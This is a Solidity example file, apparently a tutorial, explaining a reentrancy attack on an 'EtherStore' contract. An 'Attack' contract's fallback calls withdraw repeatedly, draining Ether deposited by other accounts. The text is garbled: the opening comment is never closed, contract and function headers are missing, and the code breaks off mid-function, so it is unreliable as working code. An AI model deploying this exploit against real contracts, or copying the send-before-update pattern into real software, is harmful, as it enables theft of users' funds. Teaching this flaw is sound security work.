/*
EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ether back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)

        uint256 bal = balances[msg.sender];
        require(bal > 0);

        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= AMOUNT) {
            etherStore.withdraw();
        }
    }

        require(msg.value >= AMOUNT);
